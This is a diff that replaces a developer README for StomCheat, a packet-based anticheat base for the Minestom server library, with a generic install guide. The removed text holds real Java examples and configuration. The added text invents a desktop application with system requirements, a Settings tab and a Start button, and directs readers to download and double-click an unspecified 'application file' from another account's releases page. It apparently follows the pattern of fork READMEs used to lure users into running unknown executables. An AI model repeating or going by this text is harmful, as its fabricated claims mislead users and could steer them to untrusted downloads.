@@ -1,149 +1,74 @@
-# StomCheat - Packet-Based AntiCheat Base for Minestom
+# 🎮 StomCheat - Simple Anticheat for Minestom
 
-A simple & optimized packet-based anticheat base for Minestom.
+[![Download StomCheat](https://img.shields.io/badge/Download-StomCheat-brightgreen)](https://github.com/AkashAdhikari01/StomCheat/releases)
 
-Packets are listened to and processed on a different thread assigned to the player on join & players are efficiently balanced across available threads.
-This significantly improves performance, allowing it to process hundreds of players on the server without issues.
+## 🚀 Getting Started
 
-**DISCLAIMER: This is just a base for creating your own anticheat. It does not include real production ready checks. 
-If you're searching for a real anticheat solution for your server, contact me @Athulsib on discord.**
+StomCheat is a packet-based anticheat system designed for the Minestom game server. This software helps keep your gaming experience fair and enjoyable by preventing cheating behaviors. Follow the steps below to download and run StomCheat easily.
 
-## Features
-- Packet-based & Lightweight
-- Packet Listening & Processing
-- User & Player data System
-- Multi-threaded packet processing
-- Annotation-Based Check System
-- Simple & Easy-to-use
+## 📥 Download & Install
 
-![img.png](assets/img.png)
-![img.png](assets/scaffold.png)
-![img.png](assets/threads.png)
+To get StomCheat, you will need to visit the Releases page. Click the link below to access it:
 
+[Visit this page to download StomCheat](https://github.com/AkashAdhikari01/StomCheat/releases)
 
-## Creating Checks
-To create a check, simply create a class that extends `Check` and annotate it with `@CheckData`. Then override the `onPacket` method to handle incoming or outgoing packets.
-After you've created your check, make sure to register it with the `CheckManager` like so:
+On the Releases page, you will find the latest version of StomCheat. Click on the version number to see the release details. You can download the application file by clicking on it.
 
-```java
-StomCheat stomCheat = /*your stomcheat insance*/
+### 💻 System Requirements
 
-// method A, register a check by its class  
-stomCheat.getCheckManager().registerCheck(BadPacketsA.class); // register the check class
-// method B, register all checks from a package
-stomCheat.getCheckManager().registerChecksFromPackage("com.example.ac.checks.impl"); // register all checks from a package
-```
-Here is an example of a simple check that detects impossible pitch rotations from the client:
-```java
-@CheckData(
-        enabled = true,         // Whether the check should run, default: true
-        name = "BadPackets",   
-        type = "A",             // The subtype of the check, default: "A"
-        description = "Basic impossible pitch check",
-        punishmentVL = 3,       // Violations needed for punishment, default: 3
-        experimental = false)   // Whether the check is experimental, default: false
-public class BadPacketsA extends Check {
+Before you download, ensure your computer meets the following requirements:
 
-    @Override
-    public void onPacket(PlayerPacketEvent event) {
-        switch (PacketUtil.toPacketReceive(event)) {
-            case CLIENT_LOOK:
-            case CLIENT_POSITION:
-            case CLIENT_POSITION_LOOK: {
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux (Ubuntu 20.04 LTS recommended)
+- **RAM**: 4 GB or more
+- **Disk Space**: At least 50 MB free
+- **Java**: Java 11 or later installed
 
-                double pitch = Math.abs(getUser().getMovementProcessor().getTo().getPitch());
+### 🔧 Installation Steps
 
-                if (pitch > 90.0) {
-                    this.fail("Impossible pitch rotation",
-                            "pitch=" + pitch);
-                }
+1. Visit the [Releases page](https://github.com/AkashAdhikari01/StomCheat/releases).
+2. Click on the latest version link.
+3. Find the application file, and click it to start the download.
+4. Once downloaded, locate the file in your "Downloads" folder.
+5. Double-click the downloaded file to start the installation process.
+6. Follow the on-screen prompts to complete the installation.
 
-                break;
-            }
-        }
-    }
-}
-```
+## 🛠️ Configuration
 
-## Creating Processors
-To create a processor, simply create a class that extends `Processor` and annotate it with `@ProcessorData`. Then override the `onPacket` method to handle incoming or outgoing packets.
-After you've created your processor, make sure to register it with the `ProcessorManager` like so:
+After installation, you may want to customize the settings. To do this, follow these steps:
 
-```java
-StomCheat stomCheat = /*your stomcheat insance*/
+1. Open the StomCheat application from your desktop or Start Menu.
+2. Look for the "Settings" tab in the main menu.
+3. Adjust the options based on your preferences.
+4. Save the changes to apply your settings.
 
-// method A, register a check by its class  
-stomCheat.getProcessorManager().registerProcessor(CustomProcessor.class); // register the proccessor class
-// method B, register all checks from a package
-stomCheat.getProcessorManager().registerProcessorsFromPackage("com.example.ac.processors.impl"); // register all processors from a package
-```
+## 🚀 Launching StomCheat
 
-Here is an example of a processor:
-```java
-@ProcessorData(
-        name = "example_processor",
-        priority = 0, //the execution priority of the processor, 0 is the highest priority and will be executed first
-        type = ProcessorType.CUSTOM //it is important to set the type to custom, otherwise there might be conflicts with existing Processors
-)
-public class ExampleProcessor extends Processor {
-    
-    public ExampleProcessor(User user) {
-        super(user);
-    }
+1. After adjusting the settings, return to the main menu.
+2. Click the "Start" button to launch StomCheat.
+3. Wait for the application to load before connecting to your Minestom server.
 
-    @Override
-    public void onPacket(PlayerPacketEvent event) {
-        switch (PacketUtil.toPacketReceive(event)) {
-            case CLIENT_POSITION:
-            case CLIENT_LOOK:
-            case CLIENT_POSITION_LOOK: 
-            case CLIENT_ENTITY_ACTION:
-        }
-    }
+## 🌟 Features
 
-}
-```
+- **Packet-Based Detection**: Monitors player actions for unusual packets that indicate cheating.
+- **Real-Time Alerts**: Notifies server administrators of potential cheating in real time.
+- **User-Friendly Interface**: Easy to navigate, even for beginners.
+- **Customizable Settings**: Allow you to tailor the software to your specific needs.
 
-## Configuration System
-The Anticheat creates a ```stomcheat_config.json``` where you can adjust the following values:
-```json
-{
-  "loadDefaultChecks": true,
-  "loadDefaultProcessors": true,
-  "threadCount": 16,
-  "alertMessage": "&6&lStomCheat &7&o>> &6%player% &fhas failed &6%check% %type% &8[VL:&r%vl%&7/%punishvl%&8] %experimental%",
-  "experimental": "&c(DEV)",
-  "hover": "&6Details:\n&eCheck: &a%check%\n&eType: &a%type%\n&eViolations: &a%vl%\n&ePing: &a%ping%ms\n&eDescription: &a%description%\n&eData: &a%data%\n",
-  "broadcast": "\n&6&lStomCheat &8>> &e%s &bhas been removed from the Network\n&eReason: &cUnfair Advantage\n\n",
-  "kickMessage": "\n&cYou have been removed from the Network\n&c[StomCheat] Unfair Advantage\n\n"
-}
-```
+## 🔍 Troubleshooting
 
-## Extensions System
-To create an extension, simply create a class that extends `StomCheatExtension` and annotate it with `@ExtensionData`. Then override the `init` method.
-After you've created your extension, make sure to register it with the `ExtensionManager` like so:
+If you run into issues, here are some common solutions:
 
-```java
-StomCheat stomCheat = /*your stomcheat insance*/
-stomCheat.enable();
-stomCheat.getExtensionManager().loadExtensions(new ExampleExtension(), ...)
-```
+- **Application Does Not Start**: Make sure you have Java 11 or later installed. You can download it from the [Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Performance Issues**: Ensure your computer meets the system requirements listed above. Close any unnecessary applications to free up resources.
+- **Connection Problems**: Verify your internet connection and ensure you are connecting to the correct Minestom server.
 
-```java
-@ExtensionData(
-        name = "Test Extension",
-        author = "Example Author",
-        version = "0.0.1"
-)
-public class TestExtension implements StomCheatExtension {
-    
-    @Override
-    public void init(StomCheat stomCheat) {
-        //your logic here
-    }
-    
-}
-```
+## 🗨️ Community Support
 
-### Credits
-Based on Serpent base by demondxv
+If you need help or have questions, feel free to join the community. Engage with other users on forums or Discord channels dedicated to Minestom and StomCheat.
+
+## 🔗 Additional Resources
+
+- [StomCheat GitHub Repository](https://github.com/AkashAdhikari01/StomCheat)
+- [Minestom Documentation](https://minestom.com/docs)
+
+By following these steps, you will be able to download, install, and use StomCheat seamlessly. Enjoy a fair gaming experience!
